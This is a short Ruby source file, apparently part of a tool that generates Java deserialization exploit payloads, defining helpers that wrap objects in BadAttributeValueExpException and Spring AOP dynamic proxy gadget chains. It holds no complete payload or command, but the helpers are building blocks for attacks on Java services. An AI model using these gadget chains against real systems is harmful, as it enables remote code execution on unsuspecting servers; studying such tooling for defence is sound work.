
require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module Util
        def make_tostring(obj)
          # simple but only works without a securitymanager
          Java::Serialize::JavaObject.new('Ljavax/management/BadAttributeValueExpException;', 'val' => obj)
      end
        module_function :make_tostring

        def delegateproxy(obj)
          delegateproxy_aop(obj)
        end
        module_function :delegateproxy

        def delegateproxy_aop(obj)
          as = Java::Serialize::JavaObject.new('Lorg/springframework/aop/framework/AdvisedSupport;', 'targetSource' => Java::Serialize::JavaObject.new('Lorg/springframework/aop/target/SingletonTargetSource;', 'target' => obj),
                                                                                                     'advisorChainFactory' => Java::Serialize::JavaObject.new('Lorg/springframework/aop/framework/DefaultAdvisorChainFactory;', {}),
                                                                                                     'advisors' => Java::Serialize::JavaObject.new('Ljava/util/ArrayList;', {}),
                                                                                                     'advisorArray' => Java::Serialize::JavaArray.new('Lorg/springframework/aop/Advisor;', []))

          Java::Serialize::JavaObject.new('Lorg/springframework/aop/framework/JdkDynamicAopProxy;', 'advised' => as)
        end
        module_function :delegateproxy_aop

        def make_universal_impl; end
        end
    end
  end
end
